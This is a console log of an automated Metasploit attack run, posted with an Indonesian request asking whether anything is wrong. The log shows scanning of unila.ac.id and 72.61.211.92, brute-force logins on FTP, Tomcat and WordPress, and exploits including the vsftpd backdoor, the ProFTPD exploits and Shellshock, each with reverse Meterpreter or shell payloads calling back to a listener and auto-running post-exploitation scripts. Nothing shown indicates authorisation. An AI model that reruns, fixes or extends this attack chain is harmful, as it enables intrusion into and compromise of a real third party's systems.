@@ -1,0 +1,642 @@
+coba analisa dong ada yang salah ga ?
+
+[1m[34m[*][0m Processing /tmp/crushgear_msf_xnse20jl.rc for ERB directives.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> setg LHOST 192.168.5.26
+[0mLHOST => 192.168.5.26
+resource (/tmp/crushgear_msf_xnse20jl.rc)> setg LPORT 4444
+[0mLPORT => 4444
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use exploit/multi/handler
+[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set LHOST 192.168.5.26
+[0mLHOST => 192.168.5.26
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set LPORT 4444
+[0mLPORT => 4444
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set ExitOnSession false
+[0mExitOnSession => false
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set AutoRunScript multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+[0mAutoRunScript => multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j -z
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/portscan/tcp
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS unila.ac.id
+[0mRHOSTS => unila.ac.id
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set PORTS 21,22,23,25,53,80,88,110,135,139,143,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986,8080,8443,27017
+[0mPORTS => 21,22,23,25,53,80,88,110,135,139,143,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986,8080,8443,27017
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.5.26:4444
+[1m[34m[*][0m Auxiliary module running as background job 1.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/smb/smb_ms17_010
+[0m[1m[32m[+][0m 72.61.211.92          - 72.61.211.92:21 - TCP OPEN
+[1m[32m[+][0m 72.61.211.92          - 72.61.211.92:80 - TCP OPEN
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS unila.ac.id
+[0mRHOSTS => unila.ac.id
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 2.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/smb/smb_version
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS unila.ac.id
+[0mRHOSTS => unila.ac.id
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 3.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/smb/smb_enumshares
+[0m[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS unila.ac.id
+[0mRHOSTS => unila.ac.id
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 4.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/smb/smb_enumusers
+[0m[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS unila.ac.id
+[0mRHOSTS => unila.ac.id
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 5.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/smb/smb_lookupsid
+[0m[1m[34m[*][0m Setting default action [32mLOCAL[0m - view all 2 actions with the [32mshow actions[0m command
+[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS unila.ac.id
+[0mRHOSTS => unila.ac.id
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set MinRID 500
+[0mMinRID => 500
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set MaxRID 1500
+[0mMaxRID => 1500
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 6.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/ftp/ftp_version
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 7.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/ftp/anonymous
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 8.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/ftp/ftp_login
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+[1m[32m[+][0m 72.61.211.92:21       - FTP Banner: '220 FTP Server ready.\x0d\x0a'
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set BLANK_PASSWORDS true
+[0mBLANK_PASSWORDS => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set USER_AS_PASS true
+[0mUSER_AS_PASS => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set STOP_ON_SUCCESS false
+[0mSTOP_ON_SUCCESS => false
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 9.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
+[0m[1m[34m[*][0m 72.61.211.92:21       - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m 72.61.211.92:21       - 72.61.211.92:21 - Starting FTP login sweep
+[1m[34m[*][0m 72.61.211.92:21       - Error: 72.61.211.92: Metasploit::Framework::LoginScanner::Invalid Cred details can't be blank, Cred details can't be blank (Metasploit::Framework::LoginScanner::FTP)
+[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0m[1m[34m[*][0m 72.61.211.92:21       - Scanned 1 of 1 hosts (100% complete)
+RHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set PAYLOAD cmd/unix/interact
+[0mPAYLOAD => cmd/unix/interact
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set AutoRunScript multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+[0mAutoRunScript => multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Exploit running as background job 10.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use exploit/unix/ftp/proftpd_133c_backdoor
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set PAYLOAD cmd/unix/interact
+[0m[1m[31m[-][0m The value specified for PAYLOAD is not valid.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set AutoRunScript multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+[0m[1m[33m[!][0m Unknown datastore option: AutoRunScript.
+AutoRunScript => multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[31m[-][0m 72.61.211.92:21 - Exploit failed: A payload has not been selected.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use exploit/linux/ftp/proftp_telnet_iac
+[0m[1m[34m[*][0m No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set PAYLOAD linux/x86/meterpreter/reverse_tcp
+[0mPAYLOAD => linux/x86/meterpreter/reverse_tcp
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set AutoRunScript multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+[0mAutoRunScript => multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Exploit running as background job 11.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use exploit/windows/ftp/ms09_053_ftpd_nlst
+[0m[1m[34m[*][0m No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[1m[31m[-][0m Handler failed to bind to 192.168.5.26:4444:-  -
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+[1m[31m[-][0m Handler failed to bind to 0.0.0.0:4444:-  -
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
+[0m[1m[31m[-][0m 72.61.211.92:21 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+PAYLOAD => windows/meterpreter/reverse_tcp
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set AutoRunScript multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+[0mAutoRunScript => multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[32m[+][0m 72.61.211.92          - 72.61.211.92:443 - TCP OPEN
+[1m[34m[*][0m Exploit running as background job 12.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/http_version
+[0m[1m[31m[-][0m Handler failed to bind to 192.168.5.26:4444:-  -
+[1m[31m[-][0m Handler failed to bind to 0.0.0.0:4444:-  -
+[1m[31m[-][0m 72.61.211.92:21 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 13.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/ntlm_info
+[0m
+Matching Modules
+================
+
+   #  Name                                          Disclosure Date  Rank    Check  Description
+   -  ----                                          ---------------  ----    -----  -----------
+   0  [45mauxiliary/scanner/http/ntlm_info[0m_enumeration  .                normal  No     Host Information Enumeration via NTLM Authentication
+
+
+Interact with a module by name or index. For example [32minfo 0[0m, [32muse 0[0m or [32muse auxiliary/scanner/http/ntlm_info_enumeration[0m
+
+[1m[34m[*][0m Using auxiliary/scanner/http/ntlm_info_enumeration
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 14.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/title
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 15.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/options
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 16.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/webdav_scanner
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 17.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/http_put
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Setting default action [32mPUT[0m - view all 2 actions with the [32mshow actions[0m command
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 18.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/cert
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 19.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/coldfusion_version
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 20.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/glassfish_traversal
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 21.
+[1m[31m[-][0m 72.61.211.92: Error: Connection reset by peer
+[1m[31m[-][0m 72.61.211.92:80       - Error: '72.61.211.92' 'Errno::ECONNRESET' 'Connection reset by peer - SSL_connect' '["/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/ssl_tcp.rb:152:in `connect'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/ssl_tcp.rb:152:in `block in initsock_with_ssl_version'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/timeout-0.6.0/lib/timeout.rb:295:in `block in timeout'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/timeout-0.6.0/lib/timeout.rb:38:in `handle_timeout'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/timeout-0.6.0/lib/timeout.rb:304:in `timeout'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/ssl_tcp.rb:150:in `initsock_with_ssl_version'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/ssl_tcp.rb:72:in `initsock'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/comm/local.rb:328:in `create_by_type'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/comm/local.rb:37:in `create'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket.rb:52:in `create_param'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/tcp.rb:37:in `create_param'", "/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/rex-socket-0.1.64/lib/rex/socket/tcp.rb:28:in `create'", "/usr/share/metasploit-framework/lib/msf/core/exploit/remote/tcp.rb:103:in `connect'", "/usr/share/metasploit-framework/modules/auxiliary/scanner/http/cert.rb:35:in `run_host'", "/usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:116:in `block (2 levels) in run'", "/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:105:in `block in spawn'"]'
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/joomla_version
+[0m[1m[31m[-][0m 72.61.211.92: File doesn't seem to exist. The upload probably failed
+[1m[34m[*][0m 72.61.211.92:80       - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 22.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/tomcat_mgr_login
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module running as background job 23.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/wordpress_xmlrpc_login
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 24.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/phpinfo
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[0m[1m[31m[-][0m No results from search
+[1m[34m[*][0m 72.61.211.92:80      :/xmlrpc.php - Sending Hello...
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[31m[-][0m Failed to load module: auxiliary/scanner/http/phpinfo
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 25.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/rails_mass_assignment
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[0m[1m[34m[*][0m Auxiliary module running as background job 26.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/apache_optionsbleed
+[1m[34m[*][0m 72.61.211.92:80      :/xmlrpc.php - Sending Hello...
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 27.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/http_login
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module running as background job 28.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/drupal_views_user_enum
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module running as background job 29.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/grafana_plugin_traversal
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 30.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use exploit/multi/http/apache_mod_cgi_bash_env_exec
+[0m[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set PAYLOAD linux/x86/meterpreter/reverse_tcp
+[0mPAYLOAD => linux/x86/meterpreter/reverse_tcp
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set AutoRunScript multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+[0mAutoRunScript => multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[31m[-][0m Msf::OptionValidateError One or more options failed to validate: TARGETURI.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use exploit/multi/http/webdav_upload_asp
+[0m[1m[31m[-][0m No results from search
+[1m[31m[-][0m Failed to load module: exploit/multi/http/webdav_upload_asp
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
+[0mPAYLOAD => windows/meterpreter/reverse_tcp
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set AutoRunScript multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+[0mAutoRunScript => multi_console_command -rc /tmp/crushgear_post_3sxcjopl.rc
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 80
+[0mRPORT => 80
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[31m[-][0m Msf::OptionValidateError One or more options failed to validate: TARGETURI.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/http_version
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0mRPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set SSL true
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+SSL => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 31.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/ntlm_info
+[0m
+Matching Modules
+================
+
+   #  Name                                          Disclosure Date  Rank    Check  Description
+   -  ----                                          ---------------  ----    -----  -----------
+   0  [45mauxiliary/scanner/http/ntlm_info[0m_enumeration  .                normal  No     Host Information Enumeration via NTLM Authentication
+
+
+Interact with a module by name or index. For example [32minfo 0[0m, [32muse 0[0m or [32muse auxiliary/scanner/http/ntlm_info_enumeration[0m
+
+[1m[34m[*][0m Using auxiliary/scanner/http/ntlm_info_enumeration
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0mRPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set SSL true
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+SSL => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 32.
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/title
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0mRPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set SSL true
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+SSL => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 33.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/options
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0mRPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set SSL true
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+SSL => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 34.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/webdav_scanner
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0mRPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set SSL true
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+SSL => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 35.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/cert
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set RPORT 443
+[0mRPORT => 443
+resource (/tmp/crushgear_msf_xnse20jl.rc)> set SSL true
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+SSL => true
+resource (/tmp/crushgear_msf_xnse20jl.rc)> run -j
+[0m[1m[34m[*][0m Auxiliary module running as background job 36.
+resource (/tmp/crushgear_msf_xnse20jl.rc)> use auxiliary/scanner/http/tomcat_mgr_login
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[0mresource (/tmp/crushgear_msf_xnse20jl.rc)> set RHOSTS 72.61.211.92
+[0mRHOSTS => 72.61.211.92
